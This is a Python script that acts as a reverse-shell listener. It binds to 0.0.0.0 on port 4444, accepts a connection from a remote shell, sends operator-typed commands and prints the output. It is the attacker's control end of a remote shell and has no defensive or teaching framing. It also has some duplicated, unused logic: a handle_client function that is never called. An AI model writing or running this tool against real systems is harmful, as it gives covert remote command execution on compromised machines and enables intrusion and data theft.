import socket
import threading
import sys

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444

def handle_client(conn, addr):
    print(f"[+] Shell connected: {addr[0]}:{addr[1]}")
    print("Type 'exit' to close the shell.")

    try:
        while True:
            try:
                command = input(f"{addr[0]}> ")
            except (KeyboardInterrupt, EOFError):
                print("\n[!] Interrupted. Closing connection.")
                conn.sendall(b"exit\n")
                break

            if command.strip().lower() == "exit":
                conn.sendall(b"exit\n")
                break

            conn.sendall((command + "\n").encode())

            conn.settimeout(1.0)
            response_parts = []
            while True:
                try:
                    part = conn.recv(4096)
                    if not part:
                        break
                    response_parts.append(part)
                except socket.timeout:
                    break
                except Exception as e:
                    print(f"[!] Error receiving data: {e}", file=sys.stderr)
                    break

            response = b"".join(response_parts).decode("utf-8", errors="ignore")
            print(response, end="")

    except Exception as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
    finally:
        print(f"[-] Disconnected: {addr[0]}:{addr[1]}")
        conn.close()

def start_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((LISTEN_IP, LISTEN_PORT))
        server_socket.listen()
        print(f"[*] Listening on {LISTEN_IP}:{LISTEN_PORT}...")

        try:
            conn, addr = server_socket.accept()
            print(f"[+] Shell connected: {addr[0]}:{addr[1]}")
            print("Type 'exit' to close the shell.")

            while True:
                command = input(f"{addr[0]}> ")
                if command.strip().lower() == "exit":
                    conn.sendall(b"exit\n")
                    break

                conn.sendall((command + "\n").encode())
                conn.settimeout(1.0)

                response_parts = []
                while True:
                    try:
                        part = conn.recv(4096)
                        if not part:
                            break
                        response_parts.append(part)
                    except socket.timeout:
                        break

                response = b"".join(response_parts).decode("utf-8", errors="ignore")
                print(response, end="")

        except KeyboardInterrupt:
            print("\n[*] Interrupted. Exiting cleanly.")
        finally:
            conn.close()



if __name__ == "__main__":
    start_listener()
